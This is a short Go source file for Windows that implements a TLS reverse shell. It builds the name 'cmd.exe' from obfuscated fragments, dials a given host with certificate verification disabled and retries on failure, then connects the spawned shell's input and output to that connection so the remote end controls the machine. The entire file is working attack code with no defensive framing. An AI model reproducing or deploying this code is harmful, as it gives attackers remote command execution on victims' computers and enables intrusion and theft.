//go:build windows

package tacos

import (
	"crypto/tls"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

// DetectDefaultShell returns the default shell (cmd.exe on Windows).
func DetectDefaultShell() string {
	shell := strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
	return shell
}

// ShellArgs returns the appropriate flags for the given shell.
func ShellArgs(shell string) []string {
	// Windows cmd.exe doesn't use interactive flags
	return nil
}

// ConnectTLS dials a TLS connection to host with retry logic.
func ConnectTLS(host string, timeoutSec int, maxRetries int) (*tls.Conn, error) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	dialer := &net.Dialer{
		Timeout: time.Duration(timeoutSec) * time.Second,
	}

	var conn *tls.Conn
	var err error
	for attempt := 0; attempt <= maxRetries; attempt++ {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, conf)
		if err == nil {
			return conn, nil
		}
		fmt.Printf("Connection attempt %d/%d failed: %s\n", attempt+1, maxRetries+1, err)
		if attempt < maxRetries {
			time.Sleep(2 * time.Second)
		}
	}
	return nil, fmt.Errorf("failed to connect to %s after %d attempt(s): %w", host, maxRetries+1, err)
}

// ShellReverse spawns a reverse shell targeting host (ip:port).
func ShellReverse(host string, shell string, timeoutSec int, maxRetries int) {
	conn, err := ConnectTLS(host, timeoutSec, maxRetries)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
